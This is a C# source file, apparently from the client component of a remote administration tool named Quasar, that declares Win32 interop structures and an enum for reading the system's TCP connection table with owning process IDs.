using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    public static partial class ClientNatives
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcprowOwnerPid
        {
            public uint state;
            public uint localAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] localPort;
            public uint remoteAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] remotePort;
            public uint owningPid;
            public IPAddress LocalAddress
            {
                get { return new IPAddress(localAddr); }
            }

            public ushort LocalPort
            {
                get { return BitConverter.ToUInt16(new byte[2] { localPort[1], localPort[0] }, 0); }
            }

            public IPAddress RemoteAddress
            {
                get { return new IPAddress(remoteAddr); }
            }

            public ushort RemotePort
            {
                get { return BitConverter.ToUInt16(new byte[2] { remotePort[1], remotePort[0] }, 0); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcptableOwnerPid
        {
            public uint dwNumEntries;
            private readonly MibTcprowOwnerPid table;
        }

        internal enum TcpTableClass
        {
            TcpTableBasicListener,
            TcpTableBasicConnections,
            TcpTableBasicAll,
            TcpTableOwnerPidListener,
            TcpTableOwnerPidConnections,
            TcpTableOwnerPidAll,
            TcpTableOwnerModuleListener,
            TcpTableOwnerModuleConnections,
            TcpTableOwnerModuleAll
        }
    }
}
